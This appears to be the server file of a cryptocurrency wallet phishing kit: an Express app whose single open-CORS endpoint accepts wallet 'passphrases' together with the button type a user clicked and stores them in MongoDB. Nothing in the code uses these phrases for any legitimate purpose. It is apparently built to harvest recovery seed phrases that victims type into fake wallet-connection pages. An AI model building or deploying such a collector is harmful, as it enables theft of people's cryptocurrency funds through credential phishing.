require('dotenv').config();
const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const Wallet = require('./models/Wallet');

const app = express();
const PORT = process.env.PORT || 5000;

// Middleware
app.use(cors());
app.use(express.json());

// MongoDB Connection
mongoose.connect(process.env.MONGODB_URI, {
  useNewUrlParser: true,
  useUnifiedTopology: true,
})
  .then(() => console.log('MongoDB connected'))
  .catch(err => console.error('MongoDB connection error:', err));

// API Endpoint to Save Wallet Data
app.post('/api/wallet', async (req, res) => {
  try {
    const { passphrase, buttonType } = req.body;
    
    // Basic validation
    if (!passphrase || !buttonType) {
      return res.status(400).json({ message: 'Passphrase and button type are required' });
    }

    // Create new wallet entry
    const walletEntry = new Wallet({
      passphrase,
      buttonType,
    });

    // Save to MongoDB
    await walletEntry.save();
    res.status(201).json({ message: 'Wallet data saved successfully' });
  } catch (error) {
    console.error('Error saving wallet data:', error);
    res.status(500).json({ message: 'Server error' });
  }
});

// Start Server
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});